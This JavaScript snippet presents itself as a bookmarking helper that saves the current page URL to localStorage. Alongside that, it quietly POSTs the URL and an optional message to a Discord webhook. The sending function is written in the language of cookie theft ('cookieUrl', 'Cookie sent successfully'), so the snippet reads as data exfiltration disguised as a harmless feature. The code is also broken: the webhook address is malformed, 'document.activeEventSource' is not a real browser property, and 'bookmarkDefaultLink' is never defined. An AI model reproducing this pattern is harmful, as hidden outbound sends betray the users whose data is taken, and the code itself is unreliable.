// Store bookmark information as a string of URL-encoded key-value pairs
const bookmarkData = 'https://example.com/page?param1=value1&param2=value2';

function sendToDiscordWebhook(cookieUrl) {
  // Make a POST request to the Discord webhook endpoint using fetch
  fetch(cookieUrl, { method: "POST" })
    .then(response => response.json())
    .then(data => console.log('Cookie sent successfully:', data))
    .catch(error => console.error('Error sending cookie:', error));
}

// Function to bookmark the current page URL with a custom message (optional)
function bookmarkPage(url, message = '') {
  // Encode the URL and message for safe storage
  const encodedUrl = encodeURIComponent(url);
  const encodedMessage = encodeURIComponent(message);

  // Store as key-value pairs in localStorage
  localStorage.setItem('bookmarkData', `url=${encodedUrl}&message=${encodedMessage}`);

  // Call sendToDiscordWebhook to send the bookmarked URL to Discord webhook
  sendToDiscordWebhook(`https://discord.com/webhooks/1488315746755805234${encodedUrl}&message=${encodedMessage}`);
}

// Add a click handler to your webpage's link element that triggers bookmarking
const yourLink = document.getElementById('your-link-element'); // Replace with the actual ID of your link
yourLink.addEventListener('click', function(event) {
  if (event.target.name === 'bookmark' || event.target.classList.contains('bookmark')) {
    const currentUrl = document.activeEventSource.href;
    bookmarkPage(currentUrl);
  }
});

// Example usage when the page is loaded:
document.addEventListener('DOMContentLoaded', () => {
  // If you want to automatically book a default link on load, uncomment the next line
  //bookmarkDefaultLink();
});
